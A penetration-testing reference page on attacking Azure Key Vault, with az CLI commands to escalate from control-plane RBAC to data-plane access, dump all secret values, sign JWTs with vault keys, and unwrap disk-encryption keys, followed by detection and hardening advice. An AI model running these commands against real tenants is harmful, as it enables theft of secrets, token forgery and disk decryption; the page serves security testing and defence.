---
title: Azure Key Vault attacks
slug: azure-key-vault-attacks
---

> **TL;DR:** Control-plane RBAC lets you reach the dataplane (set policies, assign roles); dataplane Get/Wrap/Decrypt then leaks secrets, signs JWTs, or unwraps disk-encryption keys.

## What it is
Key Vault has two access surfaces. The *control plane* is ARM RBAC on the vault resource (Contributor, Key Vault Contributor, Owner — these don't read secrets directly but can grant the right that does). The *data plane* is either legacy access policies or RBAC roles like `Key Vault Secrets User`, `Key Vault Crypto User`, scoped to keys/secrets/certificates. The classic escalation: a subscription Contributor can't read a secret, but can assign themselves `Key Vault Secrets User` (or in the legacy model, set an access policy granting `Get` to themselves) and then read. Keys are usable directly via `wrapKey`/`unwrapKey`/`sign`/`decrypt` without leaving the vault, which is enough to forge tokens or unwrap BEK/KEKs for disk encryption.

## Preconditions / where it applies
- Foothold with ARM RBAC on the vault (Contributor or higher), or a managed identity with dataplane roles on a vault.
- Network reachability: vault is public or you sit behind its private endpoint / firewall allowlist.
- Vault has not enabled purge protection + RBAC + private endpoint hardening.

## Technique
1. Enumerate vaults reachable from your principal.
2. If you only have control plane, grant yourself dataplane.
3. Pull secrets / use keys.

```bash
az keyvault list -o table
az keyvault show --name corp-kv --query "properties.{rbac:enableRbacAuthorization,fw:networkAcls}"
az role assignment list --scope $(az keyvault show -n corp-kv --query id -o tsv)
```

```bash
# Control plane → dataplane (RBAC mode)
ME=$(az ad signed-in-user show --query id -o tsv)
SCOPE=$(az keyvault show -n corp-kv --query id -o tsv)
az role assignment create --assignee $ME --role "Key Vault Secrets User" --scope $SCOPE

# Or (legacy access-policy mode)
az keyvault set-policy --name corp-kv --upn me@target.com --secret-permissions get list
```

```bash
# Dataplane harvesting
az keyvault secret list --vault-name corp-kv --query "[].name" -o tsv \
 | while read n; do az keyvault secret show --vault-name corp-kv --name "$n" --query value -o tsv; done

# Use a key without exporting it (forge a JWT)
az keyvault key sign --vault-name corp-kv --name signing-key --algorithm RS256 \
  --value "$(echo -n '<header>.<payload>' | openssl dgst -sha256 -binary | base64)"
```

A frequent post-ex move: VMs with the `DiskEncryptionSet` referencing a vault key — `unwrapKey` against that key returns the BEK and decrypts attached disks for offline parsing.

## Detection and defence
- Move every vault to RBAC mode + private endpoint; deny public traffic in `networkAcls`.
- Diagnostic settings → Log Analytics: alert on `VaultGet`, `SecretGet`, `KeyOperations` from non-allowlisted IPs and on `Microsoft.KeyVault/vaults/accessPolicies/write`.
- Enable purge protection + soft delete; separate keys for signing vs encryption.
- Related: [[managed-identities]], [[entra-actor-token-cross-tenant]].

## References
- [HackTricks Cloud — Az Key Vault](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-keyvault.html) — enumeration and abuse recipes.
- [Microsoft — Key Vault security overview](https://learn.microsoft.com/en-us/azure/key-vault/general/security-features) — control vs data plane reference.
